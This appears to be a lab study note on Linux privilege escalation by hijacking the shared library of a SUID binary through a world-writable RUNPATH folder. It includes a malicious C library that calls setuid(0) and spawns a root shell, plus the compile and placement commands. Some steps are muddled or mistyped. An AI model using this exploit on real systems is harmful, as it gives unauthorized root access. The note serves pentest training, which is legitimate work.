# Shared Object Hijacking
In this scenario we have to look after suid bit set binaries.
For example:
```bash
ls -la payroll

-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```
Binary  **payroll** has suit bit set.

We can use ldd to print the shared object required by a binary or shared object. Ldd displays the location of the object and the hexadecimal address where it is loaded into memory for each of a program's dependencies.
```bash
htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```
We see a non-standard library named `libshared.so` listed as a dependency for the binary. As stated earlier, it is possible to load shared libraries from custom locations
We can use following command to see path of that **payroll** library:
`readelf -d payroll  | grep PATH`
The configuration allows the loading of libraries from the `/development` folder, which is writable by all users. This misconfiguration can be exploited by placing a malicious library in `/development`

Maliciuos file:
```bash
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```
Before compiling binary we need to know function name called by library:
```bash
htb_student@NIX02:~$ ldd payroll

linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```
In that case it is `libshared.so => /development/libshared.so` so we copy binary to path
`cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so`
Then we will compile target malicious file to path which is `/development/libshared.so`
```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```
Then we will execute `payroll`
